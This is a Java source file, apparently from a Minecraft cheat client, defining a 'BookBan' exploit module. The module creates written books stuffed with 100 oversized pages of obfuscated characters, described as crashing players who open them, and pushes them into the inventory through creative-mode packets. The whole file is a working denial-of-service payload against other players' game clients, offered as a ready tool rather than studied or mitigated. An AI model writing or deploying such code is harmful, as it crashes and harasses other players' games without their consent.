package dev.oblivion.client.module.exploit;

import dev.oblivion.client.module.Category;
import dev.oblivion.client.module.Module;
import dev.oblivion.client.setting.impl.IntSetting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.RawFilteredPair;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;

public class BookBan extends Module {

    private final IntSetting copies = settings.getDefaultGroup().add(
        new IntSetting.Builder().name("Copies").description("Number of books to generate.").defaultValue(5).min(1).max(36).build()
    );

    public BookBan() {
        super("BookBan", "Creates ban books that crash players who open them.", Category.EXPLOIT);
    }

    @Override
    protected void onEnable() {
        if (mc.player == null || mc.getNetworkHandler() == null) { disable(); return; }
        if (!mc.player.getAbilities().creativeMode) {
            mc.player.sendMessage(Text.literal("\u00a7c[BookBan] Requires creative mode."), false);
            disable();
            return;
        }

        for (int c = 0; c < copies.get(); c++) {
            ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
            List<RawFilteredPair<Text>> pages = new ArrayList<>();

            StringBuilder pageContent = new StringBuilder();
            for (int i = 0; i < 800; i++) {
                pageContent.append("\u00a7k\u2588\u2592\u2591\u2593");
            }
            String content = pageContent.toString();

            for (int i = 0; i < 100; i++) {
                pages.add(RawFilteredPair.of(Text.literal(content)));
            }

            book.set(DataComponentTypes.WRITTEN_BOOK_CONTENT,
                new WrittenBookContentComponent(
                    RawFilteredPair.of("\u00a7kBanned"),
                    "Server",
                    0,
                    pages,
                    true
                )
            );

            mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + c, book));
        }

        mc.player.sendMessage(Text.literal("\u00a7a[BookBan] " + copies.get() + " ban books created."), false);
        disable();
    }
}
